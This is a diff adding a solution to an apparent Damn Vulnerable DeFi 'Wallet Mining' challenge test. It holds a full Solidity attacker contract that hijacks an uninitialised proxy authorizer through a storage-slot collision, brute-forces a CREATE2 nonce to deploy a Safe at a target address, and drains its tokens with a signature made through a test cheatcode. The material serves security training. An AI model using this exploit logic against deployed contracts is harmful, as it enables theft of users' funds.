@@ -8,6 +8,8 @@ import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contract
 import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {Vm} from "forge-std/Vm.sol";
 import {
     AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
 } from "../../src/wallet-mining/AuthorizerFactory.sol";
@@ -157,7 +159,18 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        WalletMiningAttacker attacker = new WalletMiningAttacker(
+            walletDeployer,
+            proxyFactory,
+            singletonCopy,
+            token,
+            ward,
+            user,
+            USER_DEPOSIT_ADDRESS,
+            userPrivateKey
+        );
+
+        attacker.attack();
     }
 
     /**
@@ -188,5 +201,122 @@ contract WalletMiningChallenge is Test {
 
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+contract WalletMiningAttacker {
+    WalletDeployer deployer;
+    SafeProxyFactory factory;
+    Safe singleton;
+    DamnValuableToken token;
+
+    address ward;
+    address user;
+    address deposit;
+    uint256 userKey;
+    Vm vm;
+
+    constructor(
+        WalletDeployer _deployer,
+        SafeProxyFactory _factory,
+        Safe _singleton,
+        DamnValuableToken _token,
+        address _ward,
+        address _user,
+        address _deposit,
+        uint256 _userKey
+    ) {
+        deployer = _deployer;
+        factory = _factory;
+        singleton = _singleton;
+        token = _token;
+        ward = _ward;
+        user = _user;
+        deposit = _deposit;
+        userKey = _userKey;
+        vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
+    }
+
+    function attack() external {
+        AuthorizerUpgradeable auth = AuthorizerUpgradeable(address(deployer.mom()));
+
+        address[] memory newWards = new address[](1);
+        newWards[0] = address(this);
+        address[] memory newAims = new address[](1);
+        newAims[0] = deposit;
+
+        // This works because proxy slot 0 = upgrader address != 0 = needsInit != 0
+        auth.init(newWards, newAims);
+
+        // Now we're authorized — deploy the Safe at deposit address
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+
+        bytes memory initializer = abi.encodeWithSelector(
+            Safe.setup.selector,
+            owners, 1,
+            address(0), hex"",
+            address(0), address(0), 0,
+            payable(address(0))
+        );
+
+        uint256 nonce;
+        while (computeAddress(initializer, nonce) != deposit) {
+            nonce++;
+        }
+
+        deployer.drop(deposit, initializer, nonce);
+
+        // Execute transfer out of the Safe, signed by user's key
+        Safe safe = Safe(payable(deposit));
+        bytes memory transferCalldata = abi.encodeWithSelector(
+            token.transfer.selector,
+            user,
+            token.balanceOf(deposit)
+        );
+
+        bytes32 txHash = safe.getTransactionHash(
+            address(token), 0, transferCalldata,
+            Enum.Operation.Call,
+            0, 0, 0,
+            address(0), payable(address(0)),
+            safe.nonce()
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userKey, txHash);
+        safe.execTransaction(
+            address(token), 0, transferCalldata,
+            Enum.Operation.Call,
+            0, 0, 0,
+            address(0), payable(address(0)),
+            abi.encodePacked(r, s, v)
+        );
+
+        // Send deployer reward to ward
+        token.transfer(ward, token.balanceOf(address(this)));
+    }
+
+    function approve(address tokenAddr, address spender) external {
+        IERC20(tokenAddr).approve(spender, type(uint256).max);
+    }
+
+    function computeAddress(bytes memory initializer, uint256 nonce) internal view returns (address) {
+        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
+
+        bytes memory deploymentData = abi.encodePacked(
+            type(SafeProxy).creationCode,
+            uint256(uint160(address(singleton)))
+        );
+
+        bytes32 hash = keccak256(
+            abi.encodePacked(
+                bytes1(0xff),
+                address(factory),
+                salt,
+                keccak256(deploymentData)
+            )
+        );
+
+        return address(uint160(uint256(hash)));
     }
 }
